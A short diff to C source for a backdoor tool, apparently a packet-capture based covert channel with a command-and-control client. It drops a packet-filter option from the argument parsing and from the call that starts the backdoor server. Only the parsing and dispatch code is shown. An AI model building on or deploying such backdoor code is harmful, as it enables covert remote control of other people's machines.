@@ -61,9 +61,6 @@ int main(int argc, char *argv[])
 			case 'i':
 				strncpy(rmthost, optarg, MAX_LEN); 
 				break;
-			case 'f':
-				strncpy(filter, optarg, MAX_LEN);
-				break;
 			case 'w':
 				strncpy(folder, optarg, MAX_LEN);
 				break;
@@ -97,7 +94,7 @@ int main(int argc, char *argv[])
 	if (client) // C&C Client
 		backdoor_client(ipaddr, command_chan); // Start command entry
 	else // Backdoor Server
-		pcap_start(filter, ipaddr, folder, command_chan);
+		pcap_start(ipaddr, folder, command_chan);
 	
 	return 0;
 }
